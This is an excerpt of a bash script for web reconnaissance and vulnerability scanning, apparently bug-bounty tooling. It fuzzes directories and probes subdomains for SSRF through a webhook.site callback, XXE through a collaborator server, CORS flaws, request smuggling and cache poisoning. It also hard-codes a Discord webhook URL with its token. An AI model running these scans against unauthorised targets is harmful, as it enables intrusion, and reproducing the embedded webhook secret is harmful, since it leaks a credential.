...
for subdomain in $(cat $output_dir/content/live_subdomains.txt); do
    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u "https://$subdomain/FUZZ" -mc 200,204,301,302,307,401,403 -o $output_dir/content/ffuf_${subdomain}.json
...
for subdomain in $(cat $output_dir/content/live_subdomains.txt); do
    ...
    python /home/phamtam/LinkFinder/linkfinder.py -i "https://$subdomain" -o $output_dir/content/linkfinder_${subdomain}.txt
done
...
for subdomain in $(cat $output_dir/content/live_subdomains.txt); do
    ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "https://$subdomain/FUZZ" -mc 200,201,204,301,302,307,401,403 -o $output_dir/content/api_discovery_${subdomain}.json
done
...
cat $output_dir/content/wayback_urls.txt | grep "=" | qsreplace "https://webhook.site/#!/view/8679ce74-38a6-4630-93cb-aabfb1f325f5" | httpx -silent -status-code -json -o $output_dir/vulnerabilities/potential_ssrf.json

# GraphQL introspection
echo "[+] Checking for GraphQL endpoints and introspection..."
for subdomain in $(cat $output_dir/content/live_subdomains.txt); do
    python3 /home/phamtam/graphql-cop/graphql-cop.py -t "https://$subdomain/graphql" -o $output_dir/vulnerabilities/graphql_${subdomain}.json
done
...
cat $output_dir/content/live_subdomains.txt | xmlrpcscan_linux_amd64 -server "collaborator_url.net" > $output_dir/vulnerabilities/xxe_results.txt
...
python /home/phamtam/CORScanner/cors_scan.py -i $output_dir/content/live_subdomains.txt -o $output_dir/vulnerabilities/cors_extended.txt

# HTTP request smuggling
echo "[+] Checking for HTTP request smuggling..."
python /home/phamtam/Smuggler/smuggler.py -u "https://$domain" -t 20 -o $output_dir/vulnerabilities/http_smuggling.txt

# Web cache poisoning
echo "[+] Scanning for web cache poisoning vulnerabilities..."
python3 /home/phamtam/cacheblaster/cacheblaster.py -u "https://$domain" -o $output_dir/vulnerabilities/cache_poisoning.txt
...
notify_discord() {
    local message=$1
    local webhook_url="https://discord.com/api/webhooks/1283256042414805063/UQD36ird0IwaeLuYhm4TLHjyCVwmTPTzX-nvTXw_1fOZvko_2UvSabJ1FUcRzIE5Fg1v"
...
notify_discord "Reconnaissance and vulnerability scanning for $domain has been completed. Results are saved in $output_dir."
